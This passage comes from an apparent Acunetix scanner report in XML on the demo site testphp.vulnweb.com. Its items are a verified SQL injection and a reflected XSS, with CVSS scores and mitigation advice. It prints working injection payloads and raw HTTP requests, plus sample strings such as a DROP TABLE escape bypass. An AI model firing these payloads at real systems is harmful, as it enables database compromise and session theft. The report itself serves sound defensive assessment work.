          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="66" color="red">
       <Name><![CDATA[SQL injection (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">cat</font></b> was set to <b><font color="dark">(select 1 and row(1,1)&gt;(select count(*),concat(concat(CHAR(52),CHAR(67),CHAR(117),CHAR(81),CHAR(116),CHAR(70),CHAR(114),CHAR(74),CHAR(122),CHAR(97),CHAR(103)),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))</font></b><br/>Injected pattern found: <pre wrap="virtual"><font color="blue">4CuQtFrJzag</font></pre>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[cat]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?cat=(select%201%20and%20row(1%2c1)&gt;(select%20count(*)%2cconcat(concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(81)%2cCHAR(116)%2cCHAR(70)%2cCHAR(114)%2cCHAR(74)%2cCHAR(122)%2cCHAR(97)%2cCHAR(103))%2cfloor(rand()*2))x%20from%20(select%201%20union%20select%202)a%20group%20by%20x%20limit%201)) HTTP/1.1
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:29 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4178
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="67" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">cat</font></b> was set to <b><font color="dark">4'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;kRyg(9878)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[cat]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?cat=4'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;kRyg(9878)&lt;/ScRiPt&gt; HTTP/1.1
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:29 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4219
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="68" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
